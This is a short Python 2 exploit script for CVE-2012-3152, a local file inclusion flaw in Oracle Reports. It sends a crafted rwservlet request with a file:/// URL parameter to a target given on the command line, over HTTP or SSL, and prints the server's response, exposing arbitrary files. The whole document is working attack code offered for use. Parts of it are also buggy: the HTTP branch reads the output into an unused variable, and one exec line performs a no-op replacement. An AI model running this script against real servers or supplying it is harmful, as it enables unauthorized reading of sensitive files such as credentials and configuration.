#######################################
# pwnacle.py - Exploits CVE-2012-3152 #
# Oracle Local File Inclusion (LFI)   #
#######################################

import urllib, sys, ssl, inspect

exec inspect.getsource(ssl.wrap_socket).replace("PROTOCOL_SSLv23", "PROTOCOL_SSLv23") in dict(inspect.getmembers(ssl.wrap_socket))["func_globals"] # initially (SSLv23, SSLv3)
import socket

server = sys.argv[1]  # Assigns first argument given at the CLI to 'server' variable
dir = sys.argv[2]  # Assigns second argument given at the CLI to 'dir' variable
ip = server.split('/')[2]  # formats the server by splitting the string based on the '/' which grabs the IP out of 'http://ip/'
req = '/reports/rwservlet?report=test.rdf+desformat=html+destype=cache+JOBTYPE=rwurl+URLPARAMETER="file:///'  # request format to exploit the vulnerability

print "Sending Request: " + server + req + dir + '"'

if 'http://' in server:  # Use urllib module for http -- self signed SSL certs caused an exception with urllib
    try:
        conn = urllib.urlopen(server + req + dir + '"')  # Sent the request to the server
        out = conn.readlines()
        for item in conn:
            print item.strip()
    except Exception as e:
        print e

if 'https://' in server:  # Create web request with ssl module
    try:
        conn = ssl.wrap_socket(socket.create_connection((ip, 443)))
        request = 'GET ' + req + dir + '"' + ' HTTP/1.1' + '\n'
        request += 'Host: ' + ip + '\n'
        request += 'User-Agent: Mozilla/5.0 ' + '\n'
        request += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + '\n'
        request += 'Accept-Language: en-US,en;q=0.5' + '\n'
        request += 'Accept-Encoding: gzip, deflate' + '\n'
        request += 'Connection: keep-alive' + '\n'
        conn.send(request + '\n')
        print conn.recv()
        print conn.recv(20098)

    except Exception as e:
        print e